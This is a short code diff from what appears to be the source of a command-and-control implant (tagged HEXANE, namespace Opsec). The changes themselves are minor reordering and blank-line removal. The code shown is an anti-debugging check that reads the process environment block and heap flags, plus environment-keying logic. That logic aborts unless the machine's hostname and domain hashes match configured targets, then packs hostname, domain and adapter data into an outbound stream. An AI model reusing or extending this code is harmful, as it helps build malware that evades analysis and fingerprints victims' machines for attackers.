@@ -46,12 +46,13 @@ namespace Opsec {
     VOID SeCheckDebugger() {
         HEXANE
 
-        BOOL m_x32                  = FALSE;
-        PPEB pPeb                   = PEB_POINTER;
-        PVOID pHeapBase             = nullptr;
+        PVOID pHeapBase             = { };
         ULONG HeapFlagsOffset       = 0;
         ULONG HeapForceFlagsOffset  = 0;
         BOOL VistaOrGreater         = Ctx->Session.OSVersion >= WIN_VERSION_2008;
+
+        BOOL m_x32                  = FALSE;
+        PPEB pPeb                   = PEB_POINTER;
 
         Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
 
@@ -108,12 +109,10 @@ namespace Opsec {
                 if (Utils::GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
                     return_defer(ERROR_BAD_ENVIRONMENT);
                 }
-
                 Stream::PackString(Outbound, buffer);
             } else {
                 Stream::PackDword(Outbound, 0);
             }
-
             ZeroFreePtr(buffer, length);
         }
 
@@ -126,12 +125,10 @@ namespace Opsec {
                     if (Utils::GetHashFromStringA(Ctx->Transport.Domain, x_strlen(Ctx->Transport.Domain)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
                         return_defer(ERROR_BAD_ENVIRONMENT);
                     }
-
                     Stream::PackString(Outbound, buffer);
                 } else {
                     Stream::PackDword(Outbound, 0);
                 }
-
                 ZeroFreePtr(buffer, length);
             }
         } else {
@@ -147,7 +144,6 @@ namespace Opsec {
             } else {
                 Stream::PackDword(Outbound, 0);
             }
-
             ZeroFreePtr(buffer, length);
         }
 
@@ -160,7 +156,6 @@ namespace Opsec {
             } else {
                 Stream::PackDword(Outbound, 0);
             }
-
             ZeroFreePtr(adapter, length);
         }
 
